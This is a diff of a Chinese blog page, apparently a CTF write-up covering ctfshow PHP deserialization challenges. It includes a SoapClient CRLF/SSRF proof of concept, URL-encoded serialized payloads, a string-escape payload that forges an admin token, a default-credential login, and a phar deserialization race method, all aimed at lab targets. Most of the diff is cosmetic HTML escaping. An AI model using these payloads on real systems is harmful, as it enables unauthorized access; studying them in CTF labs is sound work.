@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width">
-<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 5.4.2">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 6.3.0">
 
   <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
   <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-trophy-1.png">
@@ -160,13 +160,13 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">83</span>
+          <span class="site-state-item-count">84</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
       <div class="site-state-item site-state-categories">
           <a href="/categories/">
-        <span class="site-state-item-count">6</span>
+        <span class="site-state-item-count">7</span>
         <span class="site-state-item-name">分类</span></a>
       </div>
       <div class="site-state-item site-state-tags">
@@ -303,19 +303,19 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__call($func,$args)</span><br></pre></td></tr></table></figure>
 
 <p>默认$func为不存在函数名 $args为参数 并且以数组形式  </p>
-<p>这道题目最大问题就是没法直接通过访问/flag修改其xff为127.0.0.1来达到条件</p>
+<p>这道题目最大问题就是没法直接通过访问&#x2F;flag修改其xff为127.0.0.1来达到条件</p>
 <p>所以就需要这个内置类配合crlf来模拟一个请求包 来达到将flag存入flag.txt的条件</p>
 <p>我的理解是这样</p>
 <p>参考:<a target="_blank" rel="noopener" href="https://www.xiinnn.com/article/7741c455.html">https://www.xiinnn.com/article/7741c455.html</a> 讲的很仔细</p>
 <p>poc(偷的人家的):</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$ua</span> = <span class="string">&quot;Lxxx\r\nX-Forwarded-For: 127.0.0.1,127.0.0.1\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 13\r\n\r\ntoken=ctfshow&quot;</span>;</span><br><span class="line"><span class="variable">$client</span> = <span class="keyword">new</span> <span class="title class_">SoapClient</span>(<span class="literal">null</span>,<span class="keyword">array</span>(<span class="string">&#x27;uri&#x27;</span> =&gt; <span class="string">&#x27;http://127.0.0.1/&#x27;</span> , <span class="string">&#x27;location&#x27;</span> =&gt; <span class="string">&#x27;http://127.0.0.1/flag.php&#x27;</span> , <span class="string">&#x27;user_agent&#x27;</span> =&gt; <span class="variable">$ua</span>));</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$client</span>)));</span><br></pre></td></tr></table></figure>
 
-<p>传入payload 然后访问/flag.txt即可</p>
+<p>传入payload 然后访问&#x2F;flag.txt即可</p>
 <p>payload:<code>?vip=O%3A10%3A%22SoapClient%22%3A4%3A%7Bs%3A3%3A%22uri%22%3Bs%3A17%3A%22http%3A%2F%2F127.0.0.1%2F%22%3Bs%3A8%3A%22location%22%3Bs%3A25%3A%22http%3A%2F%2F127.0.0.1%2Fflag.php%22%3Bs%3A11%3A%22_user_agent%22%3Bs%3A128%3A%22Lxxx%0D%0AX-Forwarded-For%3A+127.0.0.1%2C127.0.0.1%0D%0AContent-Type%3A+application%2Fx-www-form-urlencoded%0D%0AContent-Length%3A+13%0D%0A%0D%0Atoken%3Dctfshow%22%3Bs%3A13%3A%22_soap_version%22%3Bi%3A1%3B%7D</code></p>
 <h1 id="WEB-260"><a href="#WEB-260" class="headerlink" title="WEB-260"></a>WEB-260</h1><p><code>?ctfshow=ctfshow_i_love_36D</code>没啥可说的</p>
 <h1 id="WEB-261"><a href="#WEB-261" class="headerlink" title="WEB-261"></a>WEB-261</h1><p>这道题目需要明白两个点 虽然这道题用不到</p>
 <ul>
-<li> __serialize() 和 __sleep()都存在则只会调用 __serialize()不会调用__sleep()</li>
+<li>__serialize() 和 __sleep()都存在则只会调用 __serialize()不会调用__sleep()</li>
 <li>__unserialize()和__wake()都存在则只会调用__unserialize()不会调用__wake()</li>
 </ul>
 <p>__invoke是个迷惑项</p>
@@ -329,9 +329,9 @@
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">message</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$from</span>=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$msg</span>=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$to</span>=<span class="string">&#x27;fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;&#x27;</span>;<span class="comment"># </span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>=<span class="string">&#x27;user&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">message</span>();</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="comment">#echo $c;</span></span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;fuck&#x27;</span>, <span class="string">&#x27;loveU&#x27;</span>, <span class="variable">$b</span>)))</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
 <p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1688540178216-b4b80ad8-03f9-4c4e-a980-5e28ab85395e.png" alt="img"></p>
-<p>payload:<code>?f=1&amp;m=1&amp;t=fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck%22%3Bs%3A5%3A%22token%22%3Bs%3A5%3A%22admin%22%3B%7D</code>    </p>
-<p>然后将cookie保存下来 访问/message 打入cookie即可获得flag</p>
-<h1 id="WEB-263-phpsession序列化"><a href="#WEB-263-phpsession序列化" class="headerlink" title="WEB-263(phpsession序列化)"></a>WEB-263(phpsession序列化)</h1><p>访问/<a target="_blank" rel="noopener" href="http://www.zip源码泄露/">www.zip源码泄露</a></p>
+<p>payload:<code>?f=1&amp;m=1&amp;t=fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck%22%3Bs%3A5%3A%22token%22%3Bs%3A5%3A%22admin%22%3B%7D</code>	</p>
+<p>然后将cookie保存下来 访问&#x2F;message 打入cookie即可获得flag</p>
+<h1 id="WEB-263-phpsession序列化"><a href="#WEB-263-phpsession序列化" class="headerlink" title="WEB-263(phpsession序列化)"></a>WEB-263(phpsession序列化)</h1><p>访问&#x2F;<a target="_blank" rel="noopener" href="http://www.zip源码泄露/">www.zip源码泄露</a></p>
 <p>这道题目一开始最大的疑惑是是我们提交上去的序列化内容在哪反序列化的</p>
 <p>网上wp千篇一律没人提及</p>
 <p>最后我也没弄明白 感觉只有这个session引擎会 所以我也就这么理解了</p>
@@ -365,7 +365,7 @@
 
 
 <h1 id="WEB-267-Yii2反序列化链"><a href="#WEB-267-Yii2反序列化链" class="headerlink" title="WEB-267(Yii2反序列化链)"></a>WEB-267(Yii2反序列化链)</h1><p>yii2是php的一个框架 直接在网上找现成的链子poc即可</p>
-<p>首先通过弱口令 admin/admin登录 然后查看about </p>
+<p>首先通过弱口令 admin&#x2F;admin登录 然后查看about </p>
 <p>提示访问<code>?r=site%2Fabout&amp;view-source</code></p>
 <p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1688552009392-f89d43dd-2251-4780-864b-91c362be0e92.png" alt="img"></p>
 <p>然后这里查看源码可以发现yii2这个信息 因为是反序列化模块嘛直接去找链子即可</p>
@@ -411,10 +411,10 @@
 <p>那么就需要进行反序列化 但是题目并没有给我们反序列化的函数</p>
 <p>然后看了wp就是通过phar来进行的 </p>
 <p>首先上传一个文件然后内容是phar生成的内容(包含我们的恶意序列化内容) 这是一个固定格式 我之前总结过这里就不赘述了</p>
-<p>但是一开始我最大的问题 我们上传的文件需要配合phar://协议 然后我们的恶意内容才会进行反序列化</p>
-<p>在哪里利用phar://呢 然后又检索了一番 原来是我们上传上去之后 脚本源码是通过unlink函数进行删除我们上传的文件的 刚好这个unlink函数就可以配合phar://协议将我们的恶意内容反序列化 </p>
+<p>但是一开始我最大的问题 我们上传的文件需要配合phar:&#x2F;&#x2F;协议 然后我们的恶意内容才会进行反序列化</p>
+<p>在哪里利用phar:&#x2F;&#x2F;呢 然后又检索了一番 原来是我们上传上去之后 脚本源码是通过unlink函数进行删除我们上传的文件的 刚好这个unlink函数就可以配合phar:&#x2F;&#x2F;协议将我们的恶意内容反序列化 </p>
 <p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1688626698460-3d19f897-bf37-42d3-9f43-4837397627db.png" alt="img"></p>
-<p>因此这里需要条件竞争 一个包一直发上传phar序列化内容的包 另一个包一直发phar://协议访问我们上传文件的包</p>
+<p>因此这里需要条件竞争 一个包一直发上传phar序列化内容的包 另一个包一直发phar:&#x2F;&#x2F;协议访问我们上传文件的包</p>
 <p>但是不知道是我哪里不对，还是题目环境问题，不管是自己发包还是别人的poc，我一直没成功，不过明白怎么做就ok了，思路最重要。</p>
 <p>然后受影响的函数有这些</p>
 <p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1688626857137-67729b1e-5c69-4be4-bad3-918e41ebd0d4.png" alt="img"></p>
